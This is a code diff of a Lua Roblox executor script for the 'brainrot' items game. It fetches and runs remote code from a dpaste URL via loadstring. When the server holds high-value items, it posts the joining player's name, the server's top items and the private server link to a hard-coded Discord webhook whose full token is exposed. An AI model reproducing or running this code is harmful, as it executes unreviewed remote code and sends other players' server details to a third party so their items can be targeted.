@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://dpaste.com/385R5UGMC.txt", true))()
 --==============================
 -- DISCORD WEBHOOK SETTINGS
 --==============================
-local WebhookURL = "https://discord.com/api/webhooks/1419673301910945802/lN4xGUEdbJOS03lAOZNyK-4qvmCvyceulN-nhkYSCsBpLIipLaDqwWdiIGz6cNb0Wh8m"
+local Webhook1 = "https://discord.com/api/webhooks/1419673301910945802/lN4xGUEdbJOS03lAOZNyK-4qvmCvyceulN-nhkYSCsBpLIipLaDqwWdiIGz6cNb0Wh8m"
 local Username = "Captain Black"
 
 --==============================
@@ -36,64 +36,81 @@ local storedPrivateServerLink = "Not available"
 -- WEBHOOK FUNCTION
 --==============================
 local function sendPlayerJoinWebhook(player)
-	local brainrots = getAllBrainrots()
-
-	if not hasHighValueBrainrotAbove10M(brainrots) then
-		return
-	end
-
-	local playerCount = #Players:GetPlayers()
-	local maxPlayers = Players.MaxPlayers
-
-	local brainrotText = "No brainrots found"
-
-	local isAuthorized = isAuthorizedUser(player)
-	local embedColor = isAuthorized and 65280 or 16711680
-	local statusMessage = isAuthorized
-		and ("Server is safe\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**")
-		or ("**Might be a trap! Be careful!!!**\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**")
-
-	local embedData = {
-		username = Username,
-		embeds = {{
-			title = "Player Joined Server",
-			color = embedColor,
-			fields = {
-				{
-					name = "Player Info",
-					value = string.format("**%s** (%s)", player.Name, player.DisplayName),
-					inline = false
-				},
-				{
-					name = "Server Status",
-					value = statusMessage,
-					inline = false
-				},
-				{
-					name = "Top Brainrots",
-					value = brainrotText,
-					inline = false
-				},
-				{
-					name = "Private Server Link",
-					value = storedPrivateServerLink,
-					inline = false
-				}
-			}
-		}}
-	}
-
-	local req = http_request or request or (syn and syn.request)
-	if req then
-		pcall(function()
-			req({
-				Url = WebhookURL,
-				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
-				Body = HttpService:JSONEncode(embedData)
-			})
-		end)
-	end
+    local brainrots = getAllBrainrots()
+    
+    if not hasHighValueBrainrotAbove10M(brainrots) then
+        return
+    end
+    
+    local joinedPlayers = Players:GetPlayers()
+    local playerCount = #joinedPlayers
+    local maxPlayers = Players.MaxPlayers
+    
+    local topBrainrots = {}
+    for i = 1, math.min(5, #brainrots) do
+        table.insert(topBrainrots, brainrots[i])
+    end
+    
+    local brainrotText = ""
+    for _, details in ipairs(topBrainrots) do
+        brainrotText = brainrotText .. string.format("**%s** - %s\n", details.name, formatMoney(details.moneyPerSec))
+    end
+    
+    local isAuthorized = isAuthorizedUser(player)
+    local embedColor
+    local statusMessage
+    
+    if isAuthorized then
+        embedColor = 65280
+        statusMessage = "Server is safe\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**"
+    else
+        embedColor = 16711680
+        statusMessage = "**Might be a trap! Be careful!!!**\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**"
+    end
+    
+    local embedData = {
+        username = Username,
+        content = "",
+        embeds = {{
+            title = "Player Joined Server",
+            color = embedColor,
+            fields = {
+                {
+                    name = "Player Info",
+                    value = string.format("**%s** (%s)", player.Name, player.DisplayName),
+                    inline = false
+                },
+                {
+                    name = "Server Status",
+                    value = statusMessage,
+                    inline = false
+                },
+                {
+                    name = "Top 5 Brainrots",
+                    value = brainrotText ~= "" and brainrotText or "No brainrots found",
+                    inline = false
+                },
+                {
+                    name = "Private Server Link",
+                    value = storedPrivateServerLink ~= "" and storedPrivateServerLink or "Not available",
+                    inline = false
+                }
+            }
+        }}
+    }
+    
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+    if req then
+        pcall(function()
+            req({
+                Url = Webhook1,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
 end
 
 --==============================
